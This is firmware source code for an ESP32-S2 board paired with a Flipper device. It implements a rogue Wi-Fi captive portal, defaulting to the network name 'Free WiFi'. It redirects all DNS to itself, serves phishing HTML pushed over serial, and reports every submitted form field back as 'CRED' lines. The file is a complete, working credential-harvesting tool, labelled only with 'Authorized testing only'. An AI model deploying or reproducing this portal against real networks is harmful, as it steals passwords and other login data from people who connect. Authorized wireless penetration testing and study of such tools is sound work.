// Flytrap firmware for the ESP32-S2 WiFi dev board.
// Speaks the Flytrap v2 wire protocol with the Flipper app over UART0 (115200).
//
// Flipper -> ESP:
//   sethtml <N>\n  then exactly N raw bytes of HTML (may contain newlines)
//   setap <ssid>\n
//   start\n | stop\n | reset\n
// ESP -> Flipper (line-oriented):
//   STATUS <token>   (boot, html_ok, ap_ok, portal_up ip=..., stopped, resetting)
//   HIT              (a station joined the AP)
//   CRED <urlencoded>   (all submitted form fields, one line per submission)
//
// Authorized testing only.

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

#define MAX_HTML_SIZE 24000
#define MAX_SSID 32

static char index_html[MAX_HTML_SIZE + 1] =
    "<html><body><h1>Flytrap</h1><p>Set a portal from the Flipper.</p></body></html>";
static size_t index_html_len = 0;
static char apName[MAX_SSID + 1] = "Free WiFi";

static DNSServer dnsServer;
static AsyncWebServer server(80);
static bool portalRunning = false;
static IPAddress apIP(192, 168, 4, 1);

// Serial command / html-stream state
static String lineBuf;
static bool readingHtml = false;
static size_t htmlRemaining = 0;
static size_t htmlPos = 0;

static String urlencode(const String& s) {
    static const char hex[] = "0123456789ABCDEF";
    String out;
    out.reserve(s.length() * 2);
    for(size_t i = 0; i < s.length(); i++) {
        char c = s[i];
        if(isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            out += c;
        } else {
            out += '%';
            out += hex[(c >> 4) & 0xF];
            out += hex[c & 0xF];
        }
    }
    return out;
}

static void captureParams(AsyncWebServerRequest* request) {
    int n = request->params();
    if(n <= 0) return;
    String out = "CRED ";
    bool first = true;
    for(int i = 0; i < n; i++) {
        const AsyncWebParameter* p = request->getParam(i);
        if(!first) out += "&";
        first = false;
        out += urlencode(p->name());
        out += "=";
        out += urlencode(p->value());
    }
    Serial.println(out);
}

class CaptiveHandler : public AsyncWebHandler {
public:
    CaptiveHandler() {}
    virtual ~CaptiveHandler() {}
    bool canHandle(AsyncWebServerRequest* request) const override {
        (void)request;
        return true; // handle every host/path so the captive portal always shows
    }
    void handleRequest(AsyncWebServerRequest* request) override {
        captureParams(request);
        request->send(200, "text/html", (const uint8_t*)index_html, index_html_len);
    }
};

static void onStaConnect(WiFiEvent_t event, WiFiEventInfo_t info) {
    (void)event;
    (void)info;
    Serial.println("HIT");
}

static void startPortal() {
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName);
    delay(100);

    dnsServer.start(53, "*", apIP);
    server.addHandler(new CaptiveHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    portalRunning = true;

    Serial.print("STATUS portal_up ip=");
    Serial.println(WiFi.softAPIP());
}

static void stopPortal() {
    if(portalRunning) {
        server.end();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        portalRunning = false;
    }
    Serial.println("STATUS stopped");
}

static void processCommand(String cmd) {
    cmd.trim();
    if(cmd.startsWith("setap ")) {
        String s = cmd.substring(6);
        s.trim();
        strlcpy(apName, s.c_str(), sizeof(apName));
        Serial.println("STATUS ap_ok");
    } else if(cmd.startsWith("sethtml ")) {
        long n = cmd.substring(8).toInt();
        if(n < 0) n = 0;
        htmlRemaining = (size_t)n;
        htmlPos = 0;
        if(htmlRemaining == 0) {
            index_html[0] = '\0';
            index_html_len = 0;
            Serial.println("STATUS html_ok");
        } else {
            readingHtml = true;
        }
    } else if(cmd == "start") {
        startPortal();
    } else if(cmd == "stop") {
        stopPortal();
    } else if(cmd == "reset") {
        Serial.println("STATUS resetting");
        delay(50);
        ESP.restart();
    }
}

static void pumpSerial() {
    while(Serial.available()) {
        char c = (char)Serial.read();
        if(readingHtml) {
            if(htmlPos < MAX_HTML_SIZE) index_html[htmlPos] = c;
            htmlPos++;
            htmlRemaining--;
            if(htmlRemaining == 0) {
                size_t stored = (htmlPos < MAX_HTML_SIZE) ? htmlPos : MAX_HTML_SIZE;
                index_html[stored] = '\0';
                index_html_len = stored;
                readingHtml = false;
                Serial.println("STATUS html_ok");
            }
        } else if(c == '\n') {
            processCommand(lineBuf);
            lineBuf = "";
        } else if(c != '\r') {
            lineBuf += c;
            if(lineBuf.length() > 200) lineBuf = ""; // runaway guard
        }
    }
}

void setup() {
    Serial.setRxBufferSize(2048);
    Serial.begin(115200);
    delay(100);
    index_html_len = strlen(index_html);
    WiFi.onEvent(onStaConnect, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    lineBuf.reserve(210);
    Serial.println("STATUS boot");
}

void loop() {
    if(portalRunning) dnsServer.processNextRequest();
    pumpSerial();
}
